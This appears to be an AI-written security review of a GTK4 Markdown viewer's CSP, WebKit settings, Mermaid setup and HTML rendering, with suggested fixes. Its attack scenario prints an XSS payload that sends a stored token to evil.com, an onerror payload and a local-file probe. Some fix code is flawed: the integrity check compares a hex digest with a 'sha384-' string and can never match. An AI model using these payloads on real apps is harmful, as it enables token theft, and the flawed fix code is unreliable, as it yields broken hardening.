**Security & Architecture Evaluation Report**
**Subject:** GTK4 Markdown Viewer with Native Mermaid Rendering  
**Date:** 2026-04-10  
**Classification:** CONFIDENTIAL – Development Review  

---

## 1. Executive Summary

Your implementation demonstrates **solid security architecture** with properly implemented Content Security Policy (CSP) nonce-based injection and strict WebKit hardening. The application is **suitable for production use** with minor hardening recommendations.

**Overall Risk Rating:** LOW (with noted mitigations already in place)

---

## 2. Security Analysis

### ✅ **Strengths (Well Implemented)**

#### 1. **Robust CSP Implementation** (`mdview_utils.py:build_preview_html`)
Your CSP is correctly restrictive:
```python
"default-src 'none'; "
f"script-src 'self' 'nonce-{nonce}'; "  # Strict nonce-based execution
"style-src 'unsafe-inline'; "           # Required for theming
"img-src 'self' data:; "                # No remote image exfiltration
"connect-src 'none'; "                  # Blocks AJAX/fetch to external
```
- **Nonce-based script execution** prevents XSS injection even if attacker controls HTML content
- **`default-src 'none'`** as baseline is defense-in-depth best practice
- **No `unsafe-eval'`** present (prevents `eval()` attacks)

#### 2. **Mermaid Security Configuration**
```javascript
securityLevel: 'strict',  // Disables click events, href injections
theme: document.documentElement.dataset.theme === 'dark' ? 'dark' : 'default'
```
- `strict` mode prevents diagram-based XSS (e.g., `click A "javascript:alert(1)"`)
- Local bundle prevents CDN hijacking (supply chain attack vector eliminated)

#### 3. **WebKit Hardening** (`markdown_editor.py:configure_webview_settings`)
Correctly disabled high-risk features:
- `enable_webgl: False` (prevents GPU exploit surface)
- `enable_webaudio: False` (prevents audio processing side-channels)
- `enable_mediasource: False` (prevents streaming media exploits)
- `enable_hyperlink_auditing: False` (privacy protection)

#### 4. **Navigation Policy Control**
The `should_block_policy_decision` correctly blocks `new-window-action` (popup prevention) while allowing internal navigation.

#### 5. **Input Handling**
- Debounced updates (150ms) prevent DoS via rapid typing
- `event.preventDefault()` on anchor clicks prevents accidental navigation

---

### ⚠️ **Vulnerabilities & Risks**

#### 🔴 **HIGH: Raw HTML Injection via Mistune**
**Location:** `mdview_utils.py:render_markdown_html`
```python
_MARKDOWN_RENDERER = mistune.create_markdown(
    escape=False,  # ⚠️ DANGEROUS: Allows raw HTML passthrough
    ...
)
```

**Attack Scenario:**
```markdown
# Normal Markdown

<script nonce="CORRECT_NONCE">fetch('http://evil.com/?data='+localStorage.getItem('token'))</script>
<img src=x onerror="alert('XSS')">
```

**Current Mitigation:** Your CSP nonce prevents execution of injected scripts **unless** the attacker knows the nonce (cryptographically improbable with `secrets.token_hex(16)`).

**Recommendation:** Add HTML sanitization as defense-in-depth:
```python
import bleach

def render_markdown_html(text):
    raw_html = _MARKDOWN_RENDERER(text)
    return bleach.clean(
        raw_html, 
        tags=['p', 'h1', 'h2', 'h3', 'pre', 'code', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'blockquote', 'del'],
        attributes={'a': ['href'], 'code': ['class'], 'pre': ['class']},
        strip=True
    )
```

#### 🟡 **MEDIUM: File Protocol Access**
**Location:** `markdown_editor.py:update_preview`
```python
self.webview.load_html(html, f"{BASE_DIR.resolve().as_uri()}/")
```

**Risk:** Base URI set to file system path allows WebView to resolve relative paths to local files. While CSP blocks external connections, a malicious markdown file could attempt:
```html
<img src="file:///etc/passwd">
```

**Verification:** Your CSP `img-src 'self' data:` should block `file://` scheme images (WebKit treats `'self'` as same-origin, which for file:// is restrictive), but test this explicitly.

**Recommendation:** Explicitly set WebKit sandbox (WebKitGTK 6.0):
```python
# In configure_webview_settings or __init__
context = self.webview.get_context()
if hasattr(context, 'set_sandbox_enabled'):
    context.set_sandbox_enabled(True)
```

#### 🟡 **MEDIUM: Prototype Pollution in Mermaid**
**Risk:** Bundled `mermaid.min.js` (v10.x based on syntax) has historical prototype pollution CVEs (CVE-2023-22488, CVE-2023-22489). The `securityLevel: 'strict'` mitigates click-based exploitation, but verify your bundle is ≥10.6.1.

---

## 3. Architecture Evaluation

### **Is this the optimal way?**

**Verdict:** Yes, for your constraints (GTK4 + Live Preview + Mermaid). 

**Trade-off Analysis:**

| Approach | Pros | Cons | Your Choice |
|----------|------|------|-------------|
| **WebView + Mermaid.js** | Full diagram fidelity, offline capable | 2.3MB bundle, JS execution surface | ✅ **Selected** |
| Python-Mermaid (CLI) | No JS in WebView | Requires Node.js subprocess, slower rendering | |
| Static SVG Generation | Zero JS execution | No live editing feedback, complex caching | |
| Cairo Native Rendering | No WebView dependency | Cannot render HTML/CSS/Mermaid | |

**Performance Optimizations Identified:**

1. **Bundle Size:** `mermaid.min.js` is 2.3MB. Consider a custom build with only required diagrams:
   ```bash
   # Build custom mermaid without Gantt, Pie, etc.
   npx @mermaid-js/mermaid-cli mermaid --input mermaid-config.json
   ```
   *Potential savings: 60-70% size reduction*

2. **Memory Management:** WebKitGTK spawns separate web processes. Your code properly manages source IDs (`GLib.source_remove`) preventing timer leaks.

3. **Redundant Re-rendering:** `update_preview` reloads the entire HTML document. For large documents (10k+ lines), consider virtual DOM diffing or incremental updates, though for a markdown viewer this is likely unnecessary.

---

## 4. Bug & Stability Assessment

### **Potential Non-Rendering Issues**

#### 1. **Race Condition in Mermaid Initialization**
**Location:** `build_preview_html` inline script
```javascript
if (window.mermaid) {
    mermaid.initialize({...});
    mermaid.run({querySelector: 'pre.mermaid'});
}
```
**Risk:** If `mermaid.min.js` loads slowly, `mermaid.run()` executes before library ready.

**Fix:** Use load callback:
```javascript
<script src="{mermaid_script_path}" onload="initMermaid()"></script>
<script nonce="{nonce}">
function initMermaid() {
    mermaid.initialize({...});
    mermaid.run({querySelector: 'pre.mermaid'});
}
</script>
```

#### 2. **PDF Export Memory Leak**
**Location:** `on_export_pdf_finish`
WebKit print operations hold references to the webview. Ensure `operation.print_()` doesn't block the main thread (it appears async, which is correct).

#### 3. **Theme Flashing**
Dark mode toggles cause full `update_preview()` rebuild. This is correct but causes white-flash when switching. Consider CSS transitions or separate style injection rather than full HTML rebuild.

#### 4. **File Handle Exhaustion**
No limit on file dialog instances. While GTK file dialogs are modal, rapid open/close could theoretically exhaust GIO file monitors.

---

## 5. Specific Recommendations

### **Immediate Actions (Pre-Release)**

1. **Add HTML Sanitization Layer**
   ```python
   # Add to requirements.txt: bleach>=6.0.0
   import bleach
   
   ALLOWED_TAGS = bleach.sanitizer.ALLOWED_TAGS + ['h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'pre', 'code', 'del', 'input', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'sup']
   ALLOWED_ATTRIBUTES = {
       '*': ['class'],
       'a': ['href', 'title'],
       'input': ['type', 'checked', 'disabled'],
       'code': ['class'],
       'pre': ['class']
   }
   
   def render_markdown_html(text):
       raw = _MARKDOWN_RENDERER(text)
       return bleach.clean(raw, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, strip=True)
   ```

2. **Enable WebKit Sandbox** (if available in your WebKitGTK 6.0 build):
   ```python
   context = self.webview.get_context()
   if hasattr(context, 'set_sandbox_enabled'):
       context.set_sandbox_enabled(True)
   ```

3. **Validate Mermaid Version**
   ```bash
   grep -o 'mermaidVersion="[0-9.]*"' assets/vendor/mermaid.min.js
   # Ensure >= 10.6.1
   ```

### **Long-term Hardening**

1. **Subresource Integrity (SRI)**
   Even for local files, verify mermaid integrity on load:
   ```python
   import hashlib
   expected_hash = "sha384-abc123..."
   with open(MERMAID_BUNDLE_PATH, 'rb') as f:
       if hashlib.sha384(f.read()).hexdigest() != expected_hash:
           raise SecurityError("Mermaid bundle tampered")
   ```

2. **Process Isolation**
   Consider using `WebKit.WebView.new_with_context()` with a separate `WebKit.WebContext` per document for crash isolation.

3. **Content Security Policy Reporting**
   Add CSP report-uri to catch injection attempts during development:
   ```python
   csp += "; report-uri http://localhost:9999/csp-report"  # Development only
   ```

---

## 6. Conclusion

Your implementation is **production-ready with minor hardening**. The CSP nonce architecture effectively mitigates the primary XSS risks introduced by `mistune(escape=False)`. The local Mermaid bundling is the correct security choice over CDN loading.

**Security Grade:** A- (Excellent CSP, minor sanitizer missing)  
**Performance Grade:** B+ (Acceptable for use case, bundle size optimizable)  
**Maintainability:** A (Clean separation of concerns, good test coverage)

**Final Recommendation:** Implement the HTML sanitization layer ( bleach ) as defense-in-depth, verify WebKit sandbox status, and ship. The architecture is sound and secure for a local desktop application handling untrusted markdown files.
